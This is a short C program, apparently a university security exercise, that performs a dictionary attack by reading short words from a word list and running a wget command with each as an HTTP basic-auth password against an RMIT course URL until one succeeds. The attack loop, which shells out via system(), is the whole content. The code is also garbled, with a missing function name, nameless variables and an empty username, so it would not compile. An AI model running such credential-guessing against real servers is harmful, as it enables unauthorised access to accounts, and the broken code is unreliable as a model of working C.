



#include <stdio.h>
#include <stdlib.h>

int ()	
{
	
  		char pasword[20];
	
		char username[]="";
		int ;				
		
  
		 
		int  counter=0;	
		char get[96];
  
  		FILE* fp;
		
		 fp = fopen("/usr/share/lib/dict/words","r");

		  	
  
			while ( fscanf(fp,"%s",&pasword) != EOF  )
			{
				 if(strlen(pasword) > 3) continue; 
				

				counter ++; 
				printf("%d         >> The Password is : %s \n",counter, pasword);
				sprintf(get,"wget --http-user=%s --http-passwd=%s http://sec-crack.cs.rmit.edu./SEC/2/",username,pasword);
  
				

				=system(get);
				if(==0) 
   				{
					printf("The Password has been cracked and it is : %s  " , pasword);
				
					exit(0);
			}

		} 
		
} 


